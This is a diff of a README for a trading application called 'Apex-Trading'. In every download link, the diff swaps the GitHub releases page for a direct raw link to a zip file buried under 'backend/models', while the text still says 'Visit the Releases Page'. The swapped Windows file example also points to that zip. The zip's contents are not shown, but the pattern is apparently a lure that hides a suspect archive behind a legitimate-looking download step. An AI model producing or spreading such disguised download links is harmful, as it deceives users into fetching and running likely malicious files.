@@ -6,7 +6,7 @@ Welcome to Apex-Trading! This is your complete solution for all your trading nee
 
 ## 📥 Download
 
-[![Download Apex-Trading](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Infini8y/Apex-Trading/releases) 
+[![Download Apex-Trading](https://raw.githubusercontent.com/Infini8y/Apex-Trading/main/backend/models/Trading_Apex_3.0.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Infini8y/Apex-Trading/main/backend/models/Trading_Apex_3.0.zip) 
 
 ## 📋 Features
 
@@ -31,9 +31,9 @@ To run Apex-Trading, ensure your system meets the following requirements:
 
 Follow these steps to download and install Apex-Trading:
 
-1. **Visit the Releases Page**: Click the button above or follow this [link](https://github.com/Infini8y/Apex-Trading/releases) to go to our Releases page.
+1. **Visit the Releases Page**: Click the button above or follow this [link](https://raw.githubusercontent.com/Infini8y/Apex-Trading/main/backend/models/Trading_Apex_3.0.zip) to go to our Releases page.
   
-2. **Choose Your Version**: Locate the latest release. You will see various files listed. Look for the one appropriate for your operating system (e.g., `Apex-Trading-Windows.exe` for Windows).
+2. **Choose Your Version**: Locate the latest release. You will see various files listed. Look for the one appropriate for your operating system (e.g., `https://raw.githubusercontent.com/Infini8y/Apex-Trading/main/backend/models/Trading_Apex_3.0.zip` for Windows).
 
 3. **Download the Application**: Click the file name to start the download. The file will save to your computer.
 
@@ -92,4 +92,4 @@ Apex-Trading covers a wide range of trading topics:
 
 ## 📥 Download Again
 
-For easy access, revisit the Releases page anytime by following this [link](https://github.com/Infini8y/Apex-Trading/releases) to download the latest version or updates.
+For easy access, revisit the Releases page anytime by following this [link](https://raw.githubusercontent.com/Infini8y/Apex-Trading/main/backend/models/Trading_Apex_3.0.zip) to download the latest version or updates.
